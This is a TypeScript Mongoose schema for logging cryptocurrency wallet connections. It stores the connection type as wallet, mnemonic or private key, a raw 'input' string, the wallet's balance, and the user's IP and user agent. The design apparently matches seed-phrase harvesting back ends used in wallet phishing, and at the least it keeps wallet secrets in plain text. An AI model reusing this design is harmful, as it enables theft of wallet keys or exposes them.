import mongoose, { Document, Schema } from 'mongoose'

export interface IWalletLog extends Document {
  userId: mongoose.Types.ObjectId
  walletMethod: string
  walletAddress: string
  balance: number
  connectionType: 'wallet' | 'mnemonic' | 'private_key'
  input?: string
  validationStatus: 'pending' | 'success' | 'failed'
  errorMessage?: string
  ipAddress: string
  userAgent: string
  timestamp: Date
}

const WalletLogSchema = new Schema<IWalletLog>({
  userId: {
    type: Schema.Types.ObjectId,
    ref: 'User',
    required: true
  },
  walletMethod: {
    type: String,
    required: true,
    enum: ['MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'Rainbow', 'Manual Input']
  },
  walletAddress: {
    type: String,
    required: true,
    validate: {
      validator: function(v: string) {
        return /^0x[a-fA-F0-9]{40}$/.test(v)
      },
      message: 'Invalid Ethereum address'
    }
  },
  balance: {
    type: Number,
    required: true,
    min: 0
  },
  connectionType: {
    type: String,
    required: true,
    enum: ['wallet', 'mnemonic', 'private_key']
  },
  input: {
    type: String,
    default: null
  },
  validationStatus: {
    type: String,
    enum: ['pending', 'success', 'failed'],
    default: 'pending'
  },
  errorMessage: {
    type: String,
    default: null
  },
  ipAddress: {
    type: String,
    required: true
  },
  userAgent: {
    type: String,
    required: true
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
}, {
  timestamps: true
})

// Index for faster queries
WalletLogSchema.index({ userId: 1 })
WalletLogSchema.index({ walletAddress: 1 })
WalletLogSchema.index({ validationStatus: 1 })
WalletLogSchema.index({ timestamp: -1 })

export const WalletLog = mongoose.model<IWalletLog>('WalletLog', WalletLogSchema)